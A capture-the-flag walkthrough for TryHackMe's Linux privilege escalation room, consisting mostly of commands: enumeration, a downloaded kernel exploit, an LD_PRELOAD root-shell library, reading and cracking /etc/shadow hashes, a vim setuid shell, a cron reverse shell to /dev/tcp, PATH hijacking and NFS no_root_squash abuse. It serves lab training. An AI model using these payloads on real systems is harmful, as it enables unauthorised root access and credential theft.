+++
title = "Lin PrivEsc (official)"
+++
# https://tryhackme.com/room/linprivesc

```bash
=================================
10.201.71.136 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.71.136' >> ~/.zshrc && source ~/.zshrc

Username: karen
Password: Password1

sshpass -p 'Password1' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 karen@$TARGET

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

### PrivEsc ###

# 1) Enumerate

hostname
id
uname -a
cat /proc/version
cat /etc/issue
cat /etc/*release*
ps axjf
env
sudo -l
pwd && ls -la
cat /etc/passwd | grep home
history
ip addr
ip route
netstat -antup

{
find / -type f -perm 0777
echo '==='
find / -perm -o w -type d
echo '==='
find / -perm -u=s -type f
} 2>/dev/null

$(which python2) --version
$(which python3) --version

find / -name python* 2>/dev/null
find / -name perl* 2>/dev/null
find / -name gcc* 2>/dev/null

# =====================================

### KERNEL EXPLOIT

uname -a
wget https://www.exploit-db.com/raw/37292
id
gcc -o kernel.exploit 37292
./kernel.exploit
id
sudo find / -type f -name flag1.txt 2>/dev/null

### LD_PRELOAD


#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# Compile
gcc -fPIC -shared -nostartfiles -o shell.so shell.c
# Run
sudo LD_PRELOAD=/tmp/shell.so find

### SUID

find / -type f -perm -04000 -ls 2>/dev/null
-rwsr-xr-x 1 root root 43352 Sep  5  2019 /usr/bin/base64

base64 /etc/shadow | base64 --decode
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::

# unshadow
base64 /etc/shadow | base64 --decode > shadow.txt
cat /etc/passwd > passwd.txt
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
// Password1        (karen)
// Password1        (user2)
// test123          (gerryconway)
// no sudoers... going to add root user instead

openssl passwd -1 -salt salty password
// $1$salty$SzJsU4qDcXp536Acnlp6I.

find / -type f -perm -04000 -ls 2>/dev/null 

### GETCAP

getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep

# abuse vim's ability to setuid via python
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

### CRON

cat /etc/crontab
...
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
// -rw-r--r-- 1 karen karen 77 Jun 20  2021 /home/karen/backup.sh
// ^^^ this will get ran as root

nc -lvnp 54321

# vim callback.sh
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/54321 0>&1

chmod +x callback.sh
// rename to backup.sh
// wait... CALLBACK!

### PATH

echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

find / -writable 2>/dev/null
...
/home/murdoch
/etc/udev/rules.d/60-cdrom_id.rules
/var/lock
/var/tmp
/var/tmp/cloud-init
/var/crash

#include <unistd.h>
#include <stdlib.h>
void main() {
    setuid(0);
    setgid(0);
    system("thm");
}

gcc -w -o thm thm.c

# --- ignore ^^^ ---

export PATH=/tmp:$PATH
cp /bin/bash /tmp/thm
# in /home/murdoch
./test

### NFS

cat /etc/exports
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
// ^^^ no_root_squash huehuehue

mkdir -p /tmp/test
mount 10.201.71.136:/home/ubuntu/sharedfolder /tmp/test

sudo gcc -o /tmp/test/nfs.exploit nfs.c -static
sudo chmod +s /tmp/test/nfs.exploit
```